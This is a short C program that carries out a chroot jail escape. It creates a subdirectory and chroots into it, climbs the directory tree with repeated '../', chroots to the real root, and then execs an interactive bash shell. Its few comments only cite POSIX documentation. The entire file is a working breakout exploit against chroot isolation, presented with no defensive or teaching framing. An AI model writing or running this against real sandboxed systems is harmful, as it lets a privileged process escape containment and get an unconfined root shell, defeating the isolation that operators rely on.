
#include <sys/stat.h>
#include <unistd.h>      // documentation: https://pubs.opengroup.org/onlinepubs/7908799/xsh/unistd.h.html

int main(void)
{
    mkdir(".out", 0755);      // create a folder with 0755 appropriate privileges
    chroot(".out");           // documentetion: https://pubs.opengroup.org/onlinepubs/7908799/xsh/chroot.html
                              // The chroot() function causes the named directory to become the root directory
    chdir("../../../../../");
    chroot(".");
    return execl("/bin/bash", "-i", NULL);
}
